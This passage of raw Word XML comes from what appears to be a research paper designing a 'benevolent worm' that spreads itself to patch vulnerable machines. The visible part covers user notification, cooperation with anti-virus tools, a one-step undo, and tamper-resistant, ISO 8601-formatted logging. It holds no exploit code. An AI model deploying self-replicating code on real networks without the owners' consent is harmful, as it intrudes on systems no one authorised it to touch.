    <w:p w:rsidR="00CB26A3" w:rsidRPr="00747AAF" w:rsidRDefault="00747AAF" w:rsidP="00747AAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>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complete history should not be used due to log size</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00747AAF"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Notification</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00747AAF" w:rsidRDefault="00747AAF" w:rsidP="00747AAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2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in semi-autonomous replication a message should be displayed on the local system informing the user of the benevolent worm about to run or state it has already run</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00747AAF" w:rsidRDefault="00CB26A3" w:rsidP="00747AAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>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 xml:space="preserve">The worm should make no effort to avoid anti-virus or IDS systems.  Instead it </w:t>
      </w:r>
      <w:r w:rsidR="00747AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>may</w:t>
      </w:r>
      <w:r w:rsidRPr="00747AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> voluntarily notify such systems that it is on the network/machine and allow them to take any action they choose at disabling it.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00747AAF" w:rsidRDefault="00CB26A3" w:rsidP="00747AAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>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Ideally the anti-virus/IDS would also notify the user that their system has an open and exploitable vulnerability that needs addressed</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00747AAF" w:rsidRDefault="00747AAF" w:rsidP="00747AAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>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lastRenderedPageBreak/>
        <w:t>Revertible</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00747AAF" w:rsidRDefault="00CB26A3" w:rsidP="00747AAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>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The worm should provide a simply command or icon that can undue everything the worm did on the system in just one step.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00747AAF"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747AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Proper auditing of the undue action should be logged as well just like in the Auditable point mentioned above.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00522134" w:rsidP="00400D80">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="20" w:name="_Toc321736792"/>
      <w:r>
        <w:t>Framework Design</w:t>
      </w:r>
      <w:bookmarkEnd w:id="20"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00A71E7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07423">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A benevolent</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> worm was developed </w:t>
      </w:r>
      <w:r w:rsidR="00B06874">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">to match desired benevolent characteristics </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>as detailed below and run multiple times on the</w:t>
      </w:r>
      <w:r w:rsidR="00B06874">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> test environment with</w:t>
      </w:r>
      <w:r w:rsidR="00007423">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> details in the "Test </w:t>
      </w:r>
      <w:r w:rsidR="00EA2226">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Procedure</w:t>
      </w:r>
      <w:r w:rsidR="00007423">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>" and “Results” sections.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00400D80">
      <w:pPr>
        <w:pStyle w:val="TH2"/>
      </w:pPr>
      <w:bookmarkStart w:id="21" w:name="_Toc321736793"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Auditable</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="005B130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Every action taken by the benevolent worm must be recorded in a log for later review by network or system administrators or users.  The content of the log may</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> be considered advanced or exper</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t as it is not expected that a non-technical user would have any interest in it other than providing a copy to an IT or technical support person.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="005B130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log file should be stored on a secondary storage persistent medium that has sufficient disk space so that the log would not cause the disk to become full.  If the worm detects that there is no appropriate place to store the log it should terminate itself immediately instead and possibly send out a signal over the network that the target has no storage space for execution.  </w:t>
      </w:r>
      <w:r w:rsidR="00D73DDA">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Additionally the log should be stored in a location with permissions that would only allow an account with Administrator privileges to access it.  This would reduce the chance of someone tampering with the log or deleting it before an administrator decides what to do with it.  Doing so, however, may prove difficult unless the worm is already running with administrator </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>privileges.  One possible location would be the Administrator account’s desktop.  Transmission of the log across the network automatically is another possibility, but care must be taken to avoid excessive network traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00BF1E5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It is possible for a third party to tamper with or even delete the log.  If access restrictions can be placed on the file then this may be limited assuming another malicious program (</w:t>
      </w:r>
      <w:r w:rsidR="008F5D03">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>example</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: worm) doesn’t also gain administrator privilege and delete or modify it.  The benevolent worm could send a network signal that the target machine was infected by it and a log generated.  If that log was missing the administrator would know someone or something deleted it.  As for modifying the log one could have the benevolent worm sign or hash each line of the log, but a malicious program could simply rewrite the entire log with a new hash code.  The benevolent worm could also digitally sign its log, but to do so it would have to have a signing key embedded in it which although more difficult could be stripped out of it by a malicious program and used by it to sign a fake or tampered log as well.  This is a problem that simply cycles back and forth like a game of cat and mouse.  If the benevolent worm is successful in patching a system and thus blocking any malicious worm then the log should be valid.  It is, however, possible that a malicious intruder/program can tamper with the log therefore it should not be fully trusted without some other external verification.  Another possibility would be to have the log sent to a central point during execution.  The central point would be a trusted store for the log.  However, it is possible that a malicious worm/program already on the system could simply block access to the central log repository or even send a fake log to it.  This also could cause scalability issues since nodes would have to send data out to this point across the network.  Another method would be a decentralized log collection facility where nodes running the benevolent worm send the data back to the originating node via their peers.  Suppose the benevolent worm peer network graph </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">resembles a binary tree.  The root (originator) node would generate its own key to sign its own log.  For child nodes the parent node would create a new key for each one to use to sign their own logs.  This continues along the tree so that the parent can state that it created and signed a key for its child node.  It is still possible that a malicious program was running on one of the nodes when the benevolent worm began execution.  It could have stolen the key for that child node which it could use to fake the log data.  That segment of the tree is untrusted for the log data </w:t>
      </w:r>
      <w:r w:rsidR="00F768AD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>for that node and any supposed child nodes</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.  However, if by some means of manual human verification a node can be ascertained as not having been compromised by a malicious intent program (with logic to specifically fake log information for the particular benevolent worm) then the log data can be verified.  This, however, requires external verification for each </w:t>
      </w:r>
      <w:r w:rsidR="00F768AD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">and every </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>node.  At best when a particular node is known to have been tampered with then all nodes under it are considered tainted as well.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="003E1306"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One aspect of the log is that a trace of nodes the benevolent worm has visited is available.  If one node’s log claims it was seeded from another node but that node’s log does not indicate that it attempted to spread itself to that child node then a discrepancy has been detected.  At that point we know that one or possibly both node’s logs are incorrect.  This could have been caused by tampering or from logs put together that are not from the same execution of the same benevolent worm.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00DA4AB8"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Proof of validity of a log on a node is a difficult problem.  The same issue exists with system logs that record things such as user logins.  If a malicious program obtains system or administrator rights it has access to modify log files to hide its tracks even if the log files were signed (RFC5848</w:t>
      </w:r>
      <w:r w:rsidR="00F55A6F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2010</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">).  The ability to detect such behavior relies on the malicious program not knowing what verification methods are in use.  The addition of new verification techniques at </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>each subsequent version of the benevolent worm can provide a small time frame for detecting tampering.  The study of this problem is left to future work.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00F172B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log content format should confirm to a known standard for easier parsing.  The encoding should be UTF8 with the appropriate byte order mark at the beginning of the file.</w:t>
      </w:r>
      <w:r w:rsidR="003E650B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  The use of UTF8 allows for a log file to contain messages from an OS in a language other than English.</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  Each line should start with a date and time stamp for that entry.  The use of the UTC time</w:t>
      </w:r>
      <w:r w:rsidR="006231BD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">zone for the stamps was chosen because it avoids daylight savings time and local machine </w:t>
      </w:r>
      <w:r w:rsidR="006231BD" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>time zone</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> confusion.  At startup the log should contain a line that states what standard it is using.  My choice was ISO 8601:2004 (ISO8601) as it provides all the necessary details and is popular in use.  An example line when reporting the standard used is given below (leading indent added for this paper but not in actual log):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00417597" w:rsidP="00D34260">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:ind w:left="360" w:right="360"/>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2012-02-20T14:51:22,</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>98Z</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>Date and time stamp format is ISO 8601:2004</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The stamp can be broken down as per the ISO 8601 specification as follows:</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first four digits represent the year (YYYY)</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Hyphens (-) are separators</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two digits represent the month (MM)</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two digits represent the day of month (DD)</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‘T’ is the ISO 8601 separator to indicate that the time is coming next</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two digits represent the 24-hour hours (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D34260">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D34260">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</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colons (:) are ISO 8601 extended format separators</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two digits represent the minutes (mm)</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two digits represent the seconds (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D34260">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D34260">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</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lastRenderedPageBreak/>
        <w:t xml:space="preserve">The comma (,) is the ISO 8601 unit faction indicator, in this case for </w:t>
      </w:r>
      <w:r w:rsidR="00546B31">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">unit </w:t>
      </w:r>
      <w:r w:rsidRPr="00D34260">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>seconds.</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next three digits represent the milliseconds (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D34260">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D34260">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) which is a fraction of a second</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00D34260"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D34260">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The ‘Z’ indicates that UTC time</w:t>
      </w:r>
      <w:r w:rsidR="0090334C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D34260">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>zone is being used and not local time</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A single log line shall consist of the following composition:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="003566D0">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:ind w:left="360" w:right="360"/>
        <w:mirrorIndents/>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&lt;ISO 8601 timestamp&gt;&lt;single tab&gt;&lt;message&gt;&lt;carriage return&gt;&lt;new line&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="003566D0"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3566D0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&lt;ISO 8601 timestamp&gt; is the date and time stamp as outlined previously</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="003566D0"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3566D0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&lt;single tab&gt; is the separator between the date and time stamp and the message.  UTF8 code 0x0009</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="003566D0"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3566D0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&lt;message&gt; is the message for the log entry.  It should not contain any control characters</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="003566D0"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3566D0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&lt;carriage return&gt; corresponds to UTF8 0x000D</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="003566D0"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3566D0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&lt;new line&gt; corresponds to UTF8 0x000A</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Local time according to the machine is used to avoid excessive traffic over the network to a time server especially if one doesn’t exist.  This could lead to incorrect times in the log.  The solution is for the source machine attempting to spread the worm to also include information about its source IP address and current date and time for logging by the worm on the target machine.  This would allow relative comparison of time and an accuracy within a few seconds from source to target as the worm spreads.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="002721D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13695">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>One</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> important log entry </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>consists</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of a hash of the worm executable</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or code</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.  This serves as version and verification information on the worm code executed on the machine.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  For the implementation used in testing the worm actually hashes its compiled code </w:t>
      </w:r>
      <w:r w:rsidR="00A13695">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memory to ensure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>a consistent version</w:t>
      </w:r>
      <w:r w:rsidR="00887188">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> hash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the code as there may not be a readable on-disk copy of the worm</w:t>
      </w:r>
      <w:r w:rsidR="00887188">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> binary</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> code.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00A1369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entry</w:t>
      </w:r>
